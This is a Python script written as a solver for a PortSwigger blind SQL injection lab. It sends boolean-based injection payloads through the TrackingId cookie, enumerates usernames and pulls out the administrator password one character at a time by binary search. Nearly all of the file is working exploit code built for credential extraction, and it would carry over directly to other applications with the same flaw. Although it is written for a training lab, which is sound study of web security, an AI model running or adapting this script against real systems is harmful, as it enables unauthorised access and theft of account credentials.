# Solver for https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# 
import argparse
import sys
import requests
import string

from utils import binary_search_with_predicate as binary_search

# url for the lab
url = ""

# sqli
sqli = {
    "or_true" : "' or 1=1--",
    "or_false" : "' or 1=2--",
    "exists_username" : "' union select 'a' from users where username='{}'--",
    "password_length" : ("' union select 'a' from users where username='{}'"
                         " and length(password) > {}--"),
    "password_char" : ("' union select 'a' from users where username='{}'"
                        " and ascii('{}') >= ascii(substring(password, {}, 1))--")
}

# username list
usernames = []

# username for the admin
username = ""

# password for the admin
password = ""
password_length = 1

def sql_inject(payload):
    response = requests.get(url,headers={
        "Cookie" : "TrackingId={}".format(payload)
    })
    return "Welcome back!" in response.text

def test_vulnerability():
    return sql_inject(sqli.get("or_true")) and not sql_inject(sqli.get("or_false"))


def load_usernames():
    global usernames
    with open("usernames.txt", "r") as f:
       usernames = f.read().splitlines()


def discover_username():
    global username
    for possible_username in usernames:
        if sql_inject(sqli.get("exists_username").format(possible_username)):
            username = possible_username
            return 
    print("Username was not found. Verify the table name or try another usernames file.")


def discover_password_length():
    global username, password_length
    while True:
        if not sql_inject(sqli.get("password_length").format(username, password_length)):
            return
        password_length += 1

def discover_password():
    global password
    charset = string.ascii_letters + string.digits
    charset = "".join(sorted(charset))

    for char_position in range(1, password_length + 1):
        index, _ = binary_search(
            (0, len(charset) - 1),
            lambda index, char_position : sql_inject(sqli.get("password_char")
                .format(username, charset[index], char_position)),
            char_position)        
        password += charset[index]


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the URL for the lab")
    args = parser.parse_args()
    url = args.url

    vulnerable = test_vulnerability()
    if not vulnerable:
        print("SQLi vulnerability not found. Exiting..")
        sys.exit()
    print("Web application is vulnerable to SQLi.")

    load_usernames()
    print("Loaded {} usernames from disk.".format(len(usernames)))

    print("Exfiltrating credentials..")

    discover_username()
    print("Username: {}".format(username))

    discover_password_length()
    discover_password()
    print("Password: {}".format(password))
